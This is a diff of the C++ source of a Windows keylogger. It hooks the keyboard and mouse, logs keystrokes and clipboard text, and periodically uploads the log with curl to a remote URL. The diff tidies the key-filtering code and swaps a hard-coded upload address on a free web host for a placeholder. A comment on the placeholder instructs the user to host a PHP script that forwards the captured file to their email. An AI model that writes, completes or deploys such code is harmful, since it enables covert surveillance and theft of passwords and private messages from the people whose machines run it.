@@ -74,8 +74,8 @@
 #define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
 #define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
 #define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
-#define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
-#define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)
+#define VK_BACKSLASH			0xDC	// \|	(VK_OEM_5)
+#define VK_APOSTROPHE			0xDB	// '?	(VK_OEM_4)
 
 HHOOK hKeyboardHook; // istancing the keyboard hook
 HHOOK hMouseHook; // istancing the mouse hook
@@ -89,21 +89,34 @@ const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // sec
 std::string clipBoardLastSave = ""; // saving the text saved in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
 
+char *my_url = ""; // --> you have to put your own website, in which you should have a ".php" file or somthing similar, where you send the file to your e-mail
+
 // Keyboard hook
 static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
 		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-
-		bool isShiftPressed = ((GetKeyState(VK_LSHIFT) & 0x8000) != 0) || ((GetKeyState(VK_RSHIFT) & 0x8000) != 0);
-		bool isCapsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-		bool isCtrlPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) || ((GetKeyState(VK_RCONTROL) & 0x8000) != 0);
-		bool isNumLockActive = ((GetKeyState(VK_NUMLOCK) & 1) != 0);
-		bool isAltPressed = ((GetKeyState(VK_LMENU) & 0x8000) != 0);
-		bool isAltGrPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0 && (GetKeyState(VK_RMENU) & 0x8000) != 0);
-
 		int vkCode = pKeyboardStruct->vkCode;
+		
+		const std::set<int> ignoredKeys = {
+			VK_ESCAPE, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7,
+			VK_F8, VK_F9, VK_F10, VK_F11, VK_F12, VK_CAPITAL,
+			VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL,
+			VK_LMENU, VK_RMENU, VK_APPS, VK_SNAPSHOT, VK_SCROLL,
+			VK_PAUSE, VK_CLEAR
+		};
+		
+		if (ignoredKeys.contains(vkCode))
+			return CallNextHookEx(NULL, nCode, wParam, lParam);
+
+		bool isShiftPressed   = GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000;
+		bool isCtrlPressed    = GetAsyncKeyState(VK_LCONTROL) & 0x8000 || GetAsyncKeyState(VK_RCONTROL) & 0x8000;
+		bool isAltPressed     = GetAsyncKeyState(VK_LMENU) & 0x8000;
+		bool isAltGrPressed   = GetAsyncKeyState(VK_LCONTROL) & 0x8000 && GetAsyncKeyState(VK_RMENU) & 0x8000;
+		bool isCapsLockActive = GetKeyState(VK_CAPITAL) & 0x0001;
+		bool isNumLockActive  = GetKeyState(VK_NUMLOCK) & 0x0001;
+
 		std::string message("");
 
 		// checking CTRL + C or CTRL + V, and SHIFT + F10 because with that you can simulate the mouse right click, then copy
@@ -422,35 +435,6 @@ static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 			message = "|ESC|";
 		}
 
-		if (vkCode == VK_ESCAPE			// ESC
-			|| vkCode == VK_F1		// F1
-			|| vkCode == VK_F2		// F2
-			|| vkCode == VK_F3		// F3
-			|| vkCode == VK_F4		// F4
-			|| vkCode == VK_F5		// F5
-			|| vkCode == VK_F6		// F6
-			|| vkCode == VK_F7		// F7
-			|| vkCode == VK_F8		// F8
-			|| vkCode == VK_F9		// F9
-			|| vkCode == VK_F10		// F10
-			|| vkCode == VK_F11		// F11
-			|| vkCode == VK_F12		// F12
-			|| vkCode == VK_CAPITAL		// CAPS LOCK
-			|| vkCode == VK_LSHIFT		// LSHIFT
-			|| vkCode == VK_RSHIFT		// RSHIFT
-			|| vkCode == VK_LCONTROL	// LCTRL
-			|| vkCode == VK_RCONTROL	// RCTRL
-			|| vkCode == VK_LMENU		// LWIN
-			|| vkCode == VK_RMENU		// RWIN
-			|| vkCode == VK_APPS		// MENU (BOTTOM RIGHT)
-			|| vkCode == VK_LMENU		// ALT
-			|| vkCode == VK_RMENU		// ALTGR (162 + 165)
-			|| vkCode == VK_SNAPSHOT	// STAMP/R SIST (PRINT)
-			|| vkCode == VK_SCROLL		// BLOCC SCORR
-			|| vkCode == VK_PAUSE		// PAUSA/INTERR
-			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
-			) return CallNextHookEx(NULL, nCode, wParam, lParam);
-
 		contentFile.append(message);
 	}
 	// return control to the Operating System
@@ -599,7 +583,7 @@ static void makeRequest() {
 	curl = curl_easy_init();
 	// Check if the curl is correctly istanced
 	if (curl) {
-		curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
+		curl_easy_setopt(curl, CURLOPT_URL, my_url);
 		// Imposting the file to send
 		struct curl_httppost* formpost = NULL;
 		struct curl_httppost* lastptr = NULL;
